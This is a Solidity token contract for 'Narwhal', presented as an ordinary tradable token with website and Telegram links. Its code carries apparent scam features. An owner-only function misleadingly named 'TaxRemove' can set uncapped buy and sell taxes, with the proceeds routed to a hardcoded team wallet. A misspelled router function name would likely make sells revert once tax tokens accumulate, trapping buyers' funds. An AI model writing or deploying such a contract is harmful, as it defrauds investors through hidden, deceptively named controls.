/*

Website: https://narwhal.today
Telegram: t.me/NarwhalANN
X: twitter.com/NarwhalToken
Dashboard: dapp.narwhal.today
WhitePaper: whitpaper.gitbook.io/narwhal

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFtaxxOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract Narwhal  {

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = "Narwhal"; 
        string public   _symbol = "Narwhal";  
        uint8 public constant decimals = 8;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buyFtaxx = 0;
        uint256 sellFtaxx = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed NarwhalTeam,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant NarwhalTeam = payable(address(0x7D06b6FAba4a02F2dCfA313F09426de5FcD76367));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == NarwhalTeam || to == NarwhalTeam);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFtaxxOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                NarwhalTeam.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FtaxxAmount = amount * (from == pair ? buyFtaxx : sellFtaxx) / 100;
                amount -= FtaxxAmount;
                balanceOf[address(this)] += FtaxxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function EnableTrading() external {
            require(msg.sender == NarwhalTeam);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemeveeTax(uint256 _buy, uint256 _sell) private {
            buyFtaxx = _buy;
            sellFtaxx = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != NarwhalTeam)        
                revert Permissions();
            _RemeveeTax(_buy, _sell);
        }
    }